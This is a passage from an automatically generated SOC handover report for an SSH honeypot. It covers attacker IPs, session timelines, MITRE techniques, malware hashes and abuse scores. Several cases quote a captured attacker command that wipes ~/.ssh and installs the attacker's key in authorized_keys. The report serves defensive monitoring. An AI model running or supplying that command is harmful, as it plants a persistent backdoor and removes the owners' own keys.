| **Source IP** | `154.221.27[.]234` |
| **First Seen** | 2026-04-19 15:36 |
| **Last Seen** | 2026-04-19 15:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 15:36:11` | `cowrie.session.connect` |
| `2026-04-19 15:36:11` | `cowrie.client.version` |
| `2026-04-19 15:36:11` | `cowrie.client.kex` |
| `2026-04-19 15:36:12` | `cowrie.login.success` |
| `2026-04-19 15:36:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.27[.]234` to AbuseIPDB if not already reported
- [ ] Block `154.221.27[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4973fecaf477

| Field | Detail |
|---|---|
| **Source IP** | `154.221.27[.]234` |
| **First Seen** | 2026-04-19 15:41 |
| **Last Seen** | 2026-04-19 15:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 15:41:10` | `cowrie.session.connect` |
| `2026-04-19 15:41:10` | `cowrie.client.version` |
| `2026-04-19 15:41:10` | `cowrie.client.kex` |
| `2026-04-19 15:41:10` | `cowrie.login.success` |
| `2026-04-19 15:41:10` | `cowrie.session.params` |
| `2026-04-19 15:41:10` | `cowrie.command.input` |
| `2026-04-19 15:41:10` | `cowrie.command.failed` |
| `2026-04-19 15:41:11` | `cowrie.log.closed` |
| `2026-04-19 15:41:11` | `cowrie.session.params` |
| `2026-04-19 15:41:11` | `cowrie.command.input` |
| `2026-04-19 15:41:11` | `cowrie.session.file_download` |
| `2026-04-19 15:41:11` | `cowrie.log.closed` |
| `2026-04-19 15:41:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.27[.]234` to AbuseIPDB if not already reported
- [ ] Block `154.221.27[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9ae3f9a2d13

| Field | Detail |
|---|---|
| **Source IP** | `154.221.27[.]234` |
| **First Seen** | 2026-04-19 15:41 |
| **Last Seen** | 2026-04-19 15:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 15:41:13` | `cowrie.session.connect` |
| `2026-04-19 15:41:13` | `cowrie.client.version` |
| `2026-04-19 15:41:13` | `cowrie.client.kex` |
| `2026-04-19 15:41:13` | `cowrie.login.success` |
| `2026-04-19 15:41:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.27[.]234` to AbuseIPDB if not already reported
- [ ] Block `154.221.27[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ad3b3edb64c

| Field | Detail |
|---|---|
| **Source IP** | `154.221.27[.]234` |
| **First Seen** | 2026-04-19 15:46 |
| **Last Seen** | 2026-04-19 15:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 15:46:02` | `cowrie.session.connect` |
| `2026-04-19 15:46:02` | `cowrie.client.version` |
| `2026-04-19 15:46:02` | `cowrie.client.kex` |
| `2026-04-19 15:46:02` | `cowrie.login.success` |
| `2026-04-19 15:46:02` | `cowrie.session.params` |
| `2026-04-19 15:46:02` | `cowrie.command.input` |
| `2026-04-19 15:46:02` | `cowrie.command.failed` |
| `2026-04-19 15:46:03` | `cowrie.log.closed` |
| `2026-04-19 15:46:03` | `cowrie.session.params` |
| `2026-04-19 15:46:03` | `cowrie.command.input` |
| `2026-04-19 15:46:03` | `cowrie.session.file_download` |
| `2026-04-19 15:46:03` | `cowrie.log.closed` |
| `2026-04-19 15:46:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.27[.]234` to AbuseIPDB if not already reported
- [ ] Block `154.221.27[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e66ae77205fe

| Field | Detail |
|---|---|
| **Source IP** | `154.221.27[.]234` |
| **First Seen** | 2026-04-19 15:46 |
| **Last Seen** | 2026-04-19 15:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 15:46:05` | `cowrie.session.connect` |
| `2026-04-19 15:46:05` | `cowrie.client.version` |
| `2026-04-19 15:46:05` | `cowrie.client.kex` |
| `2026-04-19 15:46:05` | `cowrie.login.success` |
| `2026-04-19 15:46:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.27[.]234` to AbuseIPDB if not already reported
- [ ] Block `154.221.27[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74d1a15dc87b

| Field | Detail |
|---|---|
| **Source IP** | `154.221.27[.]234` |
| **First Seen** | 2026-04-19 15:47 |
| **Last Seen** | 2026-04-19 15:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 15:47:37` | `cowrie.session.connect` |
| `2026-04-19 15:47:37` | `cowrie.client.version` |
| `2026-04-19 15:47:37` | `cowrie.client.kex` |
| `2026-04-19 15:47:37` | `cowrie.login.success` |
| `2026-04-19 15:47:38` | `cowrie.session.params` |
| `2026-04-19 15:47:38` | `cowrie.command.input` |
| `2026-04-19 15:47:38` | `cowrie.command.failed` |
| `2026-04-19 15:47:38` | `cowrie.log.closed` |
| `2026-04-19 15:47:38` | `cowrie.session.params` |
| `2026-04-19 15:47:38` | `cowrie.command.input` |
| `2026-04-19 15:47:38` | `cowrie.session.file_download` |
| `2026-04-19 15:47:38` | `cowrie.log.closed` |
| `2026-04-19 15:47:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.27[.]234` to AbuseIPDB if not already reported
- [ ] Block `154.221.27[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a46bda1c6c8

| Field | Detail |
|---|---|
| **Source IP** | `154.221.27[.]234` |
| **First Seen** | 2026-04-19 15:47 |
| **Last Seen** | 2026-04-19 15:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 15:47:40` | `cowrie.session.connect` |
| `2026-04-19 15:47:40` | `cowrie.client.version` |
| `2026-04-19 15:47:40` | `cowrie.client.kex` |
| `2026-04-19 15:47:41` | `cowrie.login.success` |
| `2026-04-19 15:47:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.27[.]234` to AbuseIPDB if not already reported
- [ ] Block `154.221.27[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8ef396fbb73

| Field | Detail |
|---|---|
| **Source IP** | `101.42.26[.]23` |
| **First Seen** | 2026-04-19 15:51 |
| **Last Seen** | 2026-04-19 15:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 15:51:38` | `cowrie.session.connect` |
| `2026-04-19 15:51:38` | `cowrie.client.version` |
| `2026-04-19 15:51:38` | `cowrie.client.kex` |
| `2026-04-19 15:51:39` | `cowrie.login.success` |
| `2026-04-19 15:51:39` | `cowrie.session.params` |
| `2026-04-19 15:51:39` | `cowrie.command.input` |
| `2026-04-19 15:51:39` | `cowrie.log.closed` |
| `2026-04-19 15:51:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.42.26[.]23` to AbuseIPDB if not already reported
- [ ] Block `101.42.26[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7add4536e8c9

| Field | Detail |
|---|---|
| **Source IP** | `154.221.27[.]234` |
| **First Seen** | 2026-04-19 15:55 |
| **Last Seen** | 2026-04-19 15:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 15:55:39` | `cowrie.session.connect` |
| `2026-04-19 15:55:39` | `cowrie.client.version` |
| `2026-04-19 15:55:39` | `cowrie.client.kex` |
| `2026-04-19 15:55:40` | `cowrie.login.success` |
| `2026-04-19 15:55:40` | `cowrie.session.params` |
| `2026-04-19 15:55:40` | `cowrie.command.input` |
| `2026-04-19 15:55:40` | `cowrie.command.failed` |
| `2026-04-19 15:55:40` | `cowrie.log.closed` |
| `2026-04-19 15:55:41` | `cowrie.session.params` |
| `2026-04-19 15:55:41` | `cowrie.command.input` |
| `2026-04-19 15:55:41` | `cowrie.session.file_download` |
| `2026-04-19 15:55:41` | `cowrie.log.closed` |
| `2026-04-19 15:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.27[.]234` to AbuseIPDB if not already reported
- [ ] Block `154.221.27[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a9f6110b847

| Field | Detail |
|---|---|
| **Source IP** | `154.221.27[.]234` |
| **First Seen** | 2026-04-19 15:55 |
| **Last Seen** | 2026-04-19 15:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 15:55:42` | `cowrie.session.connect` |
| `2026-04-19 15:55:43` | `cowrie.client.version` |
| `2026-04-19 15:55:43` | `cowrie.client.kex` |
| `2026-04-19 15:55:43` | `cowrie.login.success` |
| `2026-04-19 15:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.27[.]234` to AbuseIPDB if not already reported
- [ ] Block `154.221.27[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebd027141151

| Field | Detail |
|---|---|
| **Source IP** | `154.221.27[.]234` |
| **First Seen** | 2026-04-19 16:00 |
| **Last Seen** | 2026-04-19 16:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 16:00:27` | `cowrie.session.connect` |
| `2026-04-19 16:00:27` | `cowrie.client.version` |
| `2026-04-19 16:00:28` | `cowrie.client.kex` |
| `2026-04-19 16:00:28` | `cowrie.login.success` |
| `2026-04-19 16:00:28` | `cowrie.session.params` |
| `2026-04-19 16:00:28` | `cowrie.command.input` |
| `2026-04-19 16:00:28` | `cowrie.command.failed` |
| `2026-04-19 16:00:28` | `cowrie.log.closed` |
| `2026-04-19 16:00:29` | `cowrie.session.params` |
| `2026-04-19 16:00:29` | `cowrie.command.input` |
| `2026-04-19 16:00:29` | `cowrie.session.file_download` |
| `2026-04-19 16:00:29` | `cowrie.log.closed` |
| `2026-04-19 16:00:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.27[.]234` to AbuseIPDB if not already reported
- [ ] Block `154.221.27[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6375ddfb6bfd

| Field | Detail |
|---|---|
| **Source IP** | `154.221.27[.]234` |
| **First Seen** | 2026-04-19 16:00 |
| **Last Seen** | 2026-04-19 16:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 16:00:30` | `cowrie.session.connect` |
| `2026-04-19 16:00:30` | `cowrie.client.version` |
| `2026-04-19 16:00:31` | `cowrie.client.kex` |
| `2026-04-19 16:00:31` | `cowrie.login.success` |
| `2026-04-19 16:00:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.27[.]234` to AbuseIPDB if not already reported
- [ ] Block `154.221.27[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `154.221.27[.]234` | **25** | 2026-04-19 15:20 | 2026-04-19 16:02 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.123.43[.]7` | **15** | 2026-04-19 15:21 | 2026-04-19 15:24 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `101.126.86[.]90` | 1 | 2026-04-19 16:16 | 2026-04-19 16:17 | 62s | 0 | `T1592` | 🟢 LOW |
| `101.42.26[.]23` | 1 | 2026-04-19 15:51 | 2026-04-19 15:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.28.23[.]179` | 1 | 2026-04-19 14:44 | 2026-04-19 14:45 | 31s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **31/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `223.123.43[.]7` | PK | CMPak Limited | **100** ⚠️ | 44 |
| `101.126.86[.]90` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 31 |
| `154.221.27[.]234` | HK | Yisu Cloud Ltd | **100** ⚠️ | 50 |
| `59.28.23[.]179` | KR | Korea Telecom | **94** ⚠️ | 1 |
| `101.42.26[.]23` | CN | Tencent Cloud Computing (Beijing) Co., Ltd | **91** ⚠️ | 1 |
| `45.115.176[.]234` | IN | IAXN Telecom Pvt. Ltd. | 19 | 1 |
| `172.184.211[.]66` | US | Microsoft Limited | 8 | 3 |
| `41.121.138[.]106` | ZA | Mobile Broadband Internet - Randburg | 5 | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 50 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 25 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 25 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 12 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |

---

## 🔕 False Positive Summary (18 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 19 below threshold 25 | 14 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| AbuseIPDB score 8 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 86 cases |
| Tool 34  | Credential Extractor        | ✅ 50 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 9 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 18 filtered (20.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 9 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 25 priority case(s) shown individually · 5 recon entry/entries in table (2 group(s) consolidating 40 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-19T16:47:35Z_
